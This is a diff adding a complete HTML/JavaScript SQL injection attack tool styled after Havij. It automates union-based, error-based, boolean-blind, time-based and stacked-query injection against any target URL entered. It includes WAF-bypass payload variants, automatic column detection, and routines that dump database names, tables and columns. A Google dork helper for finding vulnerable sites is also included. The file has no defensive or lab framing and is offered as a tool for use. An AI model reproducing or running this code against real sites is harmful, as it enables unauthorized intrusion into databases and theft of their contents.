@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Tool (Offline)</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { background: #0a0a0a; color: #0c0; font-family: Consolas, monospace; padding: 12px; }
+    a { color: #0c0; }
+    h1 { font-size: 1.2rem; }
+    .tabs { margin: 8px 0; }
+    .tabs a { margin-right: 12px; padding: 4px 8px; }
+    .tabs a.active { background: #1a3a1a; }
+    .panel { display: none; margin: 12px 0; }
+    .panel.active { display: block; }
+    input[type="text"], textarea, select { background: #222; color: #0c0; border: 1px solid #0c0; padding: 4px; }
+    button { background: #1a3a1a; color: #0c0; border: 1px solid #0c0; padding: 6px 12px; cursor: pointer; }
+    button:hover { background: #2a5a2a; }
+    .out { background: #111; border: 1px solid #0c0; padding: 8px; margin-top: 8px; min-height: 80px; white-space: pre-wrap; font-size: 12px; }
+    .warn { color: #fa0; margin: 8px 0; }
+    label { display: inline-block; width: 120px; }
+    .row { margin: 6px 0; }
+  </style>
+</head>
+<body>
+  <h1>SQL Injection Tool (Offline Web Shell)</h1>
+  <p id="cors-help" class="warn">CORS: This page can only send requests to the same origin (e.g. open this file from the same domain as the target) or to servers that allow CORS. For arbitrary URLs use the C++ build (Havij-style).</p>
+  <form aria-label="SQL Injection Test Form" onsubmit="return false;">
+    <div class="tabs" role="tablist">
+      <a href="#" class="tab active" data-panel="e1" role="tab" aria-selected="true" aria-controls="panel_e1">Exploit 1 (Union)</a>
+      <a href="#" class="tab" data-panel="e2" role="tab" aria-selected="false" aria-controls="panel_e2">Exploit 2 (Error)</a>
+      <a href="#" class="tab" data-panel="e3" role="tab" aria-selected="false" aria-controls="panel_e3">Boolean Blind</a>
+      <a href="#" class="tab" data-panel="e4" role="tab" aria-selected="false" aria-controls="panel_e4">Time-based</a>
+      <a href="#" class="tab" data-panel="e5" role="tab" aria-selected="false" aria-controls="panel_e5">Meta / Reverse</a>
+    </div>
+    <div id="panel_e1" class="panel active" role="tabpanel" aria-label="Exploit 1 (Union)">
+      <div class="row"><label for="url1">Target URL</label><input type="text" id="url1" name="url1" size="70" placeholder="http://site.com/page.php?id=1" aria-label="Target URL for Union exploit" aria-describedby="cors-help" autocomplete="off"></div>
+      <div class="row"><label for="comment1">Injection vector (comment bypass)</label><select id="comment1" name="comment1" aria-label="SQL Injection Test Vector Selection" aria-required="true"><option value="">-- Select --</option><option value="--">Comment (--)</option><option value="--%20a">Comment (-- a)</option><option value="/*">Block comment (/*)</option></select></div>
+      <div class="row"><label for="encode1">Encode bypass (reverse/WAF)</label><select id="encode1" aria-label="Payload encoding for Union"><option value="0">None</option><option value="1">Unhex(Hex(...))</option><option value="2">CONVERT(... USING latin1)</option></select></div>
+    <div class="row">
+      <button id="btn1_0" type="button" aria-label="Auto-detect column count and comment">Auto-detect</button>
+      <button id="btn1_1" type="button" aria-label="Get database version and user info">Get info</button>
+      <button id="btn1_2" type="button" aria-label="List databases">Get DBs</button>
+      <button id="btn1_3" type="button" aria-label="List tables">Get tables</button>
+      <button id="btn1_4" type="button" aria-label="List columns">Get columns</button>
+    </div>
+    <div class="row"><label for="db1">DB</label><input type="text" id="db1" name="db1" size="20" aria-label="Database name" autocomplete="off"> <label for="table1">Table</label><input type="text" id="table1" name="table1" size="20" aria-label="Table name" autocomplete="off"></div>
+    <div class="row"><label for="cc1">Count col</label><input type="text" id="cc1" name="cc1" size="2" aria-label="Column count"> <label for="ec1">Exploit col</label><input type="text" id="ec1" name="ec1" size="2" aria-label="Exploit column index"> <label for="sec1">Sec bypass (0-4)</label><input type="text" id="sec1" name="sec1" size="1" value="0" aria-label="Security bypass index (4=reverse/case)"></div>
+    <div id="out1" class="out" role="status" aria-live="polite"></div>
+  </div>
+  <div id="panel_e2" class="panel" role="tabpanel" aria-label="Exploit 2 (Error-based)">
+    <div class="row"><label for="url2">Target URL</label><input type="text" id="url2" name="url2" size="70" placeholder="http://site.com/page.php?id=1" aria-label="Target URL for error-based exploit" aria-describedby="cors-help" autocomplete="off"></div>
+    <div class="row"><label for="comment2">Injection vector (comment bypass)</label><select id="comment2" name="comment2" aria-label="SQL Injection Test Vector Selection"><option value="">-- Select --</option><option value="--">Comment (--)</option></select></div>
+    <div class="row"><label for="encode2">Encode bypass (reverse/WAF)</label><select id="encode2" aria-label="Payload encoding for Error"><option value="0">None</option><option value="1">Unhex(Hex(...))</option></select></div>
+    <div class="row">
+      <button id="btn2_0" type="button" aria-label="Auto-detect error-based injection">Auto-detect</button>
+      <button id="btn2_1" type="button" aria-label="Get database version and user info">Get info</button>
+      <button id="btn2_2" type="button" aria-label="List databases">Get DBs</button>
+      <button id="btn2_3" type="button" aria-label="Get tables help">Get tables</button>
+      <button id="btn2_4" type="button" aria-label="Get columns help">Get columns</button>
+    </div>
+    <div class="row"><label for="db2">DB</label><input type="text" id="db2" name="db2" size="20" aria-label="Database name" autocomplete="off"> <label for="table2">Table</label><input type="text" id="table2" name="table2" size="20" aria-label="Table name" autocomplete="off"></div>
+    <div id="out2" class="out" role="status" aria-live="polite"></div>
+  </div>
+  <div id="panel_e3" class="panel" role="tabpanel" aria-label="Boolean blind SQL injection">
+    <div class="row"><label for="url3">Target URL</label><input type="text" id="url3" size="70" placeholder="http://site.com/page.php?id=1" aria-label="Target URL for boolean blind" autocomplete="off"></div>
+    <div class="row"><label for="comment3">Comment</label><select id="comment3"><option value="">--</option><option value="--%20a">-- a</option><option value="/*">/*</option></select> <label for="trueStr3">True page contains</label><input type="text" id="trueStr3" size="30" placeholder="Welcome" aria-label="String that appears when condition is true" autocomplete="off"></div>
+    <div class="row"><label for="query3">Extract query</label><input type="text" id="query3" size="50" value="(SELECT SUBSTRING(Version(),1,1))" placeholder="(SELECT ...)" autocomplete="off"></div>
+    <div class="row"><button id="btn3_test" type="button" aria-label="Test true/false">Test true/false</button> <button id="btn3_extract" type="button" aria-label="Extract string (binary search)">Extract string</button></div>
+    <div id="out3" class="out" role="status" aria-live="polite"></div>
+  </div>
+  <div id="panel_e4" class="panel" role="tabpanel" aria-label="Time-based blind SQL injection">
+    <div class="row"><label for="url4">Target URL</label><input type="text" id="url4" size="70" placeholder="http://site.com/page.php?id=1" aria-label="Target URL for time-based" autocomplete="off"></div>
+    <div class="row"><label for="comment4">Comment</label><select id="comment4"><option value="">--</option><option value="--%20a">-- a</option></select> <label for="sleepSec4">SLEEP (sec)</label><input type="number" id="sleepSec4" value="5" min="1" max="30" aria-label="Sleep seconds"></div>
+    <div class="row"><button id="btn4_test" type="button" aria-label="Test time-based injection">Test SLEEP</button> <button id="btn4_extract" type="button" aria-label="Extract one char by timing">Extract 1 char</button></div>
+    <div id="out4" class="out" role="status" aria-live="polite"></div>
+  </div>
+  <div id="panel_e5" class="panel" role="tabpanel" aria-label="Meta and reverse techniques">
+    <div class="row"><label for="url5">Target URL</label><input type="text" id="url5" size="70" placeholder="http://site.com/page.php?id=1" autocomplete="off"></div>
+    <div class="row"><label for="stacked5">Stacked payload</label><input type="text" id="stacked5" size="50" value="; SELECT 1 -- " placeholder="; SELECT ... -- " autocomplete="off"></div>
+    <div class="row"><button id="btn5_stacked" type="button" aria-label="Test stacked query">Test stacked</button></div>
+    <div class="row"><label for="hexDec5">Hex decode</label><input type="text" id="hexDec5" size="40" placeholder="0x3a3a3a or 3a3a3a" aria-label="Hex string to decode"></div>
+    <div class="row"><button id="btn5_hex" type="button">Decode hex</button> <span id="hexResult5"></span></div>
+    <div class="row"><label for="dork5">Dork helper</label><input type="text" id="dork5" size="50" placeholder="inurl:cartid=" aria-label="Google dork fragment"></div>
+    <div class="row"><button id="btn5_dork" type="button">Build dork URL</button> <span id="dorkResult5"></span></div>
+    <div id="out5" class="out" role="status" aria-live="polite"></div>
+  </div>
+  </form>
+
+  <script>
+(function() {
+  const SEC_BYPASS = [
+    [' Union All Select ', ''],
+    [' Union All (Select ', ')'],
+    [' /*! Union All Select ', '*/'],
+    [' /*! Union All (Select ', ')*/'],
+    [' /*!50000UnIoN*//*!50000SeLeCt ', '']
+  ];
+  const COMMENT_BYPASS = ['', '--', '--%20a', "'--%20a", "'/*"];
+  const ENCODE_BYPASS = [['', ''], ['Unhex(Hex(', '))'], ['ConVert(', '%20USING%20latin1)']];
+  const SEC2 = [['', ''], ['/*!', '*/']];
+
+  function enc(s) {
+    return encodeURIComponent(s).replace(/ /g, '%20');
+  }
+  function extractBetween(text, left, right) {
+    const i = text.indexOf(left);
+    if (i === -1) return null;
+    const j = text.indexOf(right, i + left.length);
+    if (j === -1) return null;
+    return text.slice(i + left.length, j);
+  }
+  function escapeUrl(s) {
+    return s.replace(/ /g, '%20').replace(/&/g, '%26');
+  }
+
+  async function fetchUrl(url) {
+    try {
+      const r = await fetch(url, { mode: 'cors', credentials: 'omit' });
+      return await r.text();
+    } catch (e) {
+      throw new Error('Network/CORS: ' + e.message);
+    }
+  }
+
+  // --- Exploit 1 ---
+  function out1(t) {
+    document.getElementById('out1').textContent = t;
+  }
+  function getE1Params() {
+    const url = document.getElementById('url1').value.trim().replace(/abc1/g, '&');
+    const comment = document.getElementById('comment1').value;
+    const sec = parseInt(document.getElementById('sec1').value, 10) || 0;
+    const cc = parseInt(document.getElementById('cc1').value, 10) || 0;
+    const ec = parseInt(document.getElementById('ec1').value, 10) || 0;
+    const encIdx = parseInt(document.getElementById('encode1').value, 10) || 0;
+    return { url: url, comment, sec, countColumn: cc, exploitColumn: ec, encodeIdx: encIdx };
+  }
+  function wrapPayloadE1(inner, encodeIdx) {
+    const enc = ENCODE_BYPASS[encodeIdx];
+    return enc[0] + inner + enc[1];
+  }
+
+  document.getElementById('btn1_0').onclick = async function() {
+    const p = getE1Params();
+    out1('Auto-detecting... (may take a moment)');
+    const base = p.url.replace(/'/g, '').replace(/"/g, '').replace(/=-/g, '=');
+    for (let si = 0; si < SEC_BYPASS.length; si++) {
+      const test = escapeUrl(base + ' ' + SEC_BYPASS[si][0] + ' 1 ' + SEC_BYPASS[si][1] + '-- a');
+      try {
+        const page = await fetchUrl(test);
+        const low = page.toLowerCase();
+        if (!low.includes('forbidden') && !low.includes('500 internal')) {
+          p.secBypass = si;
+          break;
+        }
+      } catch (e) {
+        out1('Error: ' + e.message);
+        return;
+      }
+    }
+    let commentIdx = 0;
+    for (let ci = 0; ci < COMMENT_BYPASS.length; ci++) {
+      const c = COMMENT_BYPASS[ci];
+      const pre = c.startsWith("'") ? "'" : (c.startsWith(')') ? ')' : (c.startsWith('"') ? '"' : ''));
+      const suf = c.replace(/^['")]/, '');
+      const u1 = escapeUrl(base + ' ' + pre + ' Order By 1 ' + suf);
+      const u2 = escapeUrl(base + ' ' + pre + ' Order By 9999 ' + suf);
+      const u3 = escapeUrl(base + ' ' + pre + ' Order By 10000 ' + suf);
+      try {
+        const [r1, r2, r3] = await Promise.all([fetchUrl(u1), fetchUrl(u2), fetchUrl(u3)]);
+        const clean = (s) => s.replace(/=/g,'x').replace(/\(/g,'x').replace(/'/g,'x').replace(/\)/g,'x').replace(/\s/g,'').replace(/http/g,'').replace(/"/g,'');
+        const a1 = clean(r1).split('x').filter(Boolean);
+        const a9 = clean(r2).split('x').filter(Boolean);
+        const a10 = clean(r3).split('x').filter(Boolean);
+        let d = 0, s = 0;
+        for (let j = 0; j < Math.min(a1.length, a9.length, a10.length); j++) {
+          if (a9[j] === a1[j] && a9[j] !== a10[j]) d++;
+          if (a9[j] !== a1[j] && a9[j] === a10[j]) s++;
+        }
+        if (s > 5 && s > d) { commentIdx = ci; p.commentBypass = suf; break; }
+      } catch (e) {
+        out1('Error: ' + e.message);
+        return;
+      }
+    }
+    const pre = COMMENT_BYPASS[commentIdx].startsWith("'") ? "'" : (COMMENT_BYPASS[commentIdx].startsWith(')') ? ')' : (COMMENT_BYPASS[commentIdx].startsWith('"') ? '"' : ''));
+    p.url = base + pre;
+    document.getElementById('url1').value = p.url;
+    document.getElementById('comment1').value = p.commentBypass;
+    document.getElementById('sec1').value = p.secBypass;
+    out1('Auto-detect: now binary-search column count (simplified: try 1–15).');
+    let foundCol = 0;
+    for (let col = 1; col <= 15; col++) {
+      const cnt = Array.from({ length: col }, (_, i) => i + 1 === 3 ? 'Concat(0x3a3a3a,' + (i+1) + ',0x3a3a3a)' : (i+1)).join(',');
+      const u = escapeUrl(p.url + SEC_BYPASS[p.secBypass][0] + cnt + SEC_BYPASS[p.secBypass][1] + ' ' + p.commentBypass);
+      try {
+        const page = await fetchUrl(u);
+        const m = extractBetween(page, ':::', ':::');
+        if (m && /^\d+$/.test(m.trim())) {
+          foundCol = col;
+          const exploitCol = parseInt(m.trim(), 10);
+          document.getElementById('cc1').value = foundCol;
+          document.getElementById('ec1').value = exploitCol;
+          out1('[+] Done. countColumn=' + foundCol + ' exploitColumn=' + exploitCol + '\nComment bypass: ' + p.commentBypass + '\nYou can click Get info / Get DBs now.');
+          return;
+        }
+      } catch (e) {}
+    }
+    out1('[-] Could not detect column count in 1–15. Try setting countColumn/exploitColumn manually.');
+  };
+
+  document.getElementById('btn1_1').onclick = async function() {
+    const p = getE1Params();
+    if (!p.countColumn || !p.exploitColumn) { out1('Run Auto-detect first or set count column & exploit column'); return; }
+    const inner = '(Concat(0x3a3a3a,Version(),0x2c2c,User(),0x2c2c,Database(),0x3a3a3a))';
+    const payload = wrapPayloadE1(inner, p.encodeIdx);
+    const cnt = Array.from({ length: p.countColumn }, (_, i) => i + 1 === p.exploitColumn ? payload : (i+1)).join(',');
+    const u = escapeUrl(p.url + ' ' + SEC_BYPASS[p.secBypass][0] + cnt + ' ' + SEC_BYPASS[p.secBypass][1] + ' ' + p.commentBypass);
+    try {
+      const page = await fetchUrl(u);
+      const block = extractBetween(page, ':::', ':::');
+      if (!block) { out1('No :::...::: found. Check URL and params.'); return; }
+      const parts = block.split(',');
+      out1('version(): ' + (parts[0]||'') + '\nuser(): ' + (parts[1]||'') + '\ndatabase(): ' + (parts[2]||''));
+    } catch (e) {
+      out1('Error: ' + e.message);
+    }
+  };
+
+  document.getElementById('btn1_2').onclick = async function() {
+    const p = getE1Params();
+    if (!p.countColumn || !p.exploitColumn) { out1('Run Auto-detect first'); return; }
+    const payload = wrapPayloadE1('(Concat(0x3a3a3a,Substr(Group_Concat(Schema_Name),1,10000),0x3a3a3a))', p.encodeIdx);
+    const cnt = Array.from({ length: p.countColumn }, (_, i) => i + 1 === p.exploitColumn ? payload : (i+1)).join(',');
+    const u = escapeUrl(p.url + ' ' + SEC_BYPASS[p.secBypass][0] + cnt + ' From Information_Schema.Schemata ' + SEC_BYPASS[p.secBypass][1] + ' ' + p.commentBypass);
+    try {
+      const page = await fetchUrl(u);
+      const block = extractBetween(page, ':::', ':::');
+      if (!block) { out1('No :::...::: found'); return; }
+      const dbs = block.split(',').map(s => s.trim()).filter(Boolean);
+      out1('Databases:\n' + dbs.join('\n'));
+    } catch (e) {
+      out1('Error: ' + e.message);
+    }
+  };
+
+  document.getElementById('btn1_3').onclick = async function() {
+    const p = getE1Params();
+    const db = document.getElementById('db1').value.trim();
+    if (!db) { out1('Enter DB name'); return; }
+    const charDb = 'char(' + Array.from(db).map(c => c.charCodeAt(0)).join(',') + ')';
+    const payload = wrapPayloadE1('(Concat(0x3a3a3a,Substr(Group_Concat(Table_Name),1,10000),0x3a3a3a))', p.encodeIdx);
+    const cnt = Array.from({ length: p.countColumn }, (_, i) => i + 1 === p.exploitColumn ? payload : (i+1)).join(',');
+    const u = escapeUrl(p.url + ' ' + SEC_BYPASS[p.secBypass][0] + cnt + ' From Information_Schema.Tables Where Table_Schema=' + charDb + ' ' + SEC_BYPASS[p.secBypass][1] + ' ' + p.commentBypass);
+    try {
+      const page = await fetchUrl(u);
+      const block = extractBetween(page, ':::', ':::');
+      if (!block) { out1('No :::...::: found'); return; }
+      const tables = block.split(',').map(s => s.trim()).filter(Boolean);
+      out1('Tables:\n' + tables.join('\n'));
+    } catch (e) {
+      out1('Error: ' + e.message);
+    }
+  };
+
+  document.getElementById('btn1_4').onclick = async function() {
+    const p = getE1Params();
+    const db = document.getElementById('db1').value.trim();
+    const table = document.getElementById('table1').value.trim();
+    if (!db || !table) { out1('Enter DB and Table'); return; }
+    const charDb = 'char(' + Array.from(db).map(c => c.charCodeAt(0)).join(',') + ')';
+    const charTbl = 'char(' + Array.from(table).map(c => c.charCodeAt(0)).join(',') + ')';
+    const payload = wrapPayloadE1('(Concat(0x3a3a3a,Substr(Group_Concat(Column_Name),1,10000),0x3a3a3a))', p.encodeIdx);
+    const cnt = Array.from({ length: p.countColumn }, (_, i) => i + 1 === p.exploitColumn ? payload : (i+1)).join(',');
+    const u = escapeUrl(p.url + SEC_BYPASS[p.secBypass][0] + cnt + ' From Information_Schema.Columns Where Table_Schema=' + charDb + ' And Table_Name=' + charTbl + ' ' + SEC_BYPASS[p.secBypass][1] + ' ' + p.commentBypass);
+    try {
+      const page = await fetchUrl(u);
+      const block = extractBetween(page, ':::', ':::');
+      if (!block) { out1('No :::...::: found'); return; }
+      const cols = block.split(',').map(s => s.trim()).filter(Boolean);
+      out1('Columns:\n' + cols.join('\n'));
+    } catch (e) {
+      out1('Error: ' + e.message);
+    }
+  };
+
+  // --- Exploit 2 ---
+  function out2(t) {
+    document.getElementById('out2').textContent = t;
+  }
+  function getE2Params() {
+    const url = document.getElementById('url2').value.trim().replace(/abc1/g, '&');
+    const comment = document.getElementById('comment2').value;
+    const encodeIdx = parseInt(document.getElementById('encode2').value, 10) || 0;
+    return { url, comment, secBypass: 0, encodeIdx };
+  }
+  function buildE2(p, payload) {
+    const sec = SEC2[p.secBypass];
+    const comment = p.comment || document.getElementById('comment2').value;
+    if (p.encodeIdx === 1) payload = 'Unhex(Hex(' + payload + '))';
+    const e1 = sec[0] + ' And (Select 1 From(Select Count(*),Concat(CHAR(58,58,58),';
+    const e2 = ',floor(rand(0)*2),CHAR(58,58,58))x From Information_Schema.Tables Group By x)a) ' + sec[1] + comment;
+    return escapeUrl(p.url + e1 + payload + e2);
+  }
+
+  document.getElementById('btn2_0').onclick = async function() {
+    const p = getE2Params();
+    out2('Auto-detecting (error-based)...');
+    const base = p.url.replace(/'/g, '');
+    for (let si = 0; si < SEC2.length; si++) {
+      for (let ci = 0; ci < COMMENT_BYPASS.length; ci++) {
+        const pre = COMMENT_BYPASS[ci].startsWith("'") ? "'" : (COMMENT_BYPASS[ci].startsWith(')') ? ')' : (COMMENT_BYPASS[ci].startsWith('"') ? '"' : ''));
+        const suf = COMMENT_BYPASS[ci].replace(/^['")]/, '');
+        const e1 = pre + SEC2[si][0] + ' And (Select 1 From(Select Count(*),Concat(CHAR(58,58,58),';
+        const e2 = ',floor(rand(0)*2),CHAR(58,58,58))x From Information_Schema.Tables Group By x)a) ' + SEC2[si][1] + suf;
+        const u = escapeUrl(base + e1 + '(Version())' + e2);
+        try {
+          const page = await fetchUrl(u);
+          if (page.includes(':::')) {
+            document.getElementById('url2').value = base + (pre || '');
+            document.getElementById('comment2').value = suf;
+            out2('[+] Done. Use Get info / Get DBs now.');
+            return;
+          }
+        } catch (e) {}
+      }
+    }
+    out2('[-] No combo found. Error-based needs visible MySQL errors on the page.');
+  };
+
+  document.getElementById('btn2_1').onclick = async function() {
+    const p = getE2Params();
+    try {
+      let u = buildE2(p, '(Version())');
+      let page = await fetchUrl(u);
+      let v = extractBetween(page, ':::', '1:::') || extractBetween(page, ':::', ':::') || '';
+      u = buildE2(p, '(User())');
+      page = await fetchUrl(u);
+      let user = extractBetween(page, ':::', '1:::') || extractBetween(page, ':::', ':::') || '';
+      u = buildE2(p, '(Database())');
+      page = await fetchUrl(u);
+      let db = extractBetween(page, ':::', '1:::') || extractBetween(page, ':::', ':::') || '';
+      out2('version(): ' + v + '\nuser(): ' + user + '\ndatabase(): ' + db);
+    } catch (e) {
+      out2('Error: ' + e.message);
+    }
+  };
+
+  document.getElementById('btn2_2').onclick = async function() {
+    const p = getE2Params();
+    p.comment = document.getElementById('comment2').value;
+    const payload = '(Select Schema_Name From Information_Schema.Schemata Limit 0,1)';
+    try {
+      const u = buildE2(p, payload);
+      const page = await fetchUrl(u);
+      const block = extractBetween(page, ':::', '1:::') || extractBetween(page, ':::', ':::');
+      out2(block ? 'First DB: ' + block : 'No result. Try Get info first.');
+    } catch (e) {
+      out2('Error: ' + e.message);
+    }
+  };
+
+  document.getElementById('btn2_3').onclick = async function() {
+    out2('Enter DB and use Get columns with DB+Table for full list.');
+  };
+  document.getElementById('btn2_4').onclick = async function() {
+    out2('Enter DB and Table, then implement column dump (see C++ version).');
+  };
+
+  // --- Exploit 3: Boolean blind ---
+  function out3(t) { document.getElementById('out3').textContent = t; }
+  document.getElementById('btn3_test').onclick = async function() {
+    const url = document.getElementById('url3').value.trim().replace(/abc1/g, '&');
+    const comment = document.getElementById('comment3').value;
+    const trueStr = document.getElementById('trueStr3').value.trim();
+    if (!url || !trueStr) { out3('Set URL and True page contains'); return; }
+    const uTrue = escapeUrl(url + "' AND 1=1 " + comment);
+    const uFalse = escapeUrl(url + "' AND 1=0 " + comment);
+    try {
+      const [rT, rF] = await Promise.all([fetchUrl(uTrue), fetchUrl(uFalse)]);
+      const hasTrue = rT.includes(trueStr);
+      const hasFalse = rF.includes(trueStr);
+      out3('True (1=1) contains "' + trueStr + '": ' + hasTrue + '\nFalse (1=0) contains "' + trueStr + '": ' + hasFalse + '\n' + (hasTrue && !hasFalse ? '[+] Boolean blind likely works.' : '[-] Adjust true string or comment.'));
+    } catch (e) { out3('Error: ' + e.message); }
+  };
+  document.getElementById('btn3_extract').onclick = async function() {
+    const url = document.getElementById('url3').value.trim().replace(/abc1/g, '&');
+    const comment = document.getElementById('comment3').value;
+    const trueStr = document.getElementById('trueStr3').value.trim();
+    const subq = document.getElementById('query3').value.trim() || '(SELECT SUBSTRING(Version(),1,1))';
+    if (!url || !trueStr) { out3('Set URL and True page contains'); return; }
+    let result = '';
+    let pos = 1;
+    out3('Extracting (binary search ASCII)...');
+    while (true) {
+      let lo = 0, hi = 256;
+      while (hi - lo > 1) {
+        const mid = (lo + hi) >> 1;
+        const u = escapeUrl(url + "' AND ASCII(SUBSTRING(" + subq + "," + pos + ",1))>" + mid + " " + comment);
+        try {
+          const r = await fetchUrl(u);
+          if (r.includes(trueStr)) lo = mid; else hi = mid;
+        } catch (e) { out3('Error at pos ' + pos + ': ' + e.message); return; }
+      }
+      const uEq = escapeUrl(url + "' AND ASCII(SUBSTRING(" + subq + "," + pos + ",1))=" + lo + " " + comment);
+      try {
+        const r = await fetchUrl(uEq);
+        if (!r.includes(trueStr)) break;
+      } catch (e) { break; }
+      result += String.fromCharCode(lo);
+      out3('So far: ' + result);
+      pos++;
+      if (pos > 200) break;
+    }
+    out3('Extracted: ' + (result || '(empty)'));
+  };
+
+  // --- Exploit 4: Time-based ---
+  function out4(t) { document.getElementById('out4').textContent = t; }
+  document.getElementById('btn4_test').onclick = async function() {
+    const url = document.getElementById('url4').value.trim().replace(/abc1/g, '&');
+    const comment = document.getElementById('comment4').value;
+    const sec = parseInt(document.getElementById('sleepSec4').value, 10) || 5;
+    if (!url) { out4('Set URL'); return; }
+    const uSleep = escapeUrl(url + "' AND SLEEP(" + sec + ") " + comment);
+    const uNorm = escapeUrl(url + "' " + comment);
+    try {
+      const t0 = performance.now();
+      await fetchUrl(uNorm);
+      const tNorm = performance.now() - t0;
+      const t1 = performance.now();
+      await fetchUrl(uSleep);
+      const tSleep = performance.now() - t1;
+      out4('Normal: ' + (tNorm / 1000).toFixed(2) + 's\nWith SLEEP(' + sec + '): ' + (tSleep / 1000).toFixed(2) + 's\n' + (tSleep > tNorm + sec * 0.8 * 1000 ? '[+] Time-based likely works.' : '[-] No significant delay.'));
+    } catch (e) { out4('Error: ' + e.message); }
+  };
+  document.getElementById('btn4_extract').onclick = async function() {
+    const url = document.getElementById('url4').value.trim().replace(/abc1/g, '&');
+    const comment = document.getElementById('comment4').value;
+    const sec = parseInt(document.getElementById('sleepSec4').value, 10) || 5;
+    const subq = '(SELECT SUBSTRING(Version(),1,1))';
+    if (!url) { out4('Set URL'); return; }
+    let lo = 0, hi = 256;
+    while (hi - lo > 1) {
+      const mid = (lo + hi) >> 1;
+      const u = escapeUrl(url + "' AND IF(ASCII(SUBSTRING(" + subq + ",1,1))>" + mid + ",SLEEP(" + sec + "),0) " + comment);
+      const t0 = performance.now();
+      try { await fetchUrl(u); } catch (e) { out4('Error: ' + e.message); return; }
+      const elapsed = performance.now() - t0;
+      if (elapsed >= sec * 1000 * 0.8) lo = mid; else hi = mid;
+    }
+    out4('First char of Version(): ' + (lo ? String.fromCharCode(lo) : '(null)'));
+  };
+
+  // --- Exploit 5: Meta / Reverse ---
+  function out5(t) { document.getElementById('out5').textContent = t; }
+  document.getElementById('btn5_stacked').onclick = async function() {
+    const url = document.getElementById('url5').value.trim().replace(/abc1/g, '&');
+    const stacked = document.getElementById('stacked5').value.trim();
+    if (!url) { out5('Set URL'); return; }
+    const u = escapeUrl(url + stacked);
+    try {
+      const r = await fetchUrl(u);
+      out5('Status: Request sent. Response length: ' + r.length + '\nStacked queries work only if backend uses multi_query (e.g. mysqli_multi_query).');
+    } catch (e) { out5('Error: ' + e.message); }
+  };
+  document.getElementById('btn5_hex').onclick = function() {
+    let hex = document.getElementById('hexDec5').value.trim().replace(/^0x/i, '');
+    if (!hex) { document.getElementById('hexResult5').textContent = ''; return; }
+    hex = hex.replace(/\s/g, '');
+    const bytes = [];
+    for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));
+    document.getElementById('hexResult5').textContent = bytes.map(b => String.fromCharCode(b)).join('');
+  };
+  document.getElementById('btn5_dork').onclick = function() {
+    const dork = document.getElementById('dork5').value.trim();
+    const q = encodeURIComponent(dork);
+    document.getElementById('dorkResult5').innerHTML = '<a href="https://www.google.com/search?q=' + q + '" target="_blank" rel="noopener">Open dork</a>';
+  };
+
+  document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', function(e) {
+      e.preventDefault();
+      document.querySelectorAll('.tab').forEach(t => {
+        t.classList.remove('active');
+        t.setAttribute('aria-selected', 'false');
+      });
+      document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+      this.classList.add('active');
+      this.setAttribute('aria-selected', 'true');
+      document.getElementById('panel_' + this.dataset.panel).classList.add('active');
+    });
+  });
+})();
+  </script>
+</body>
+</html>
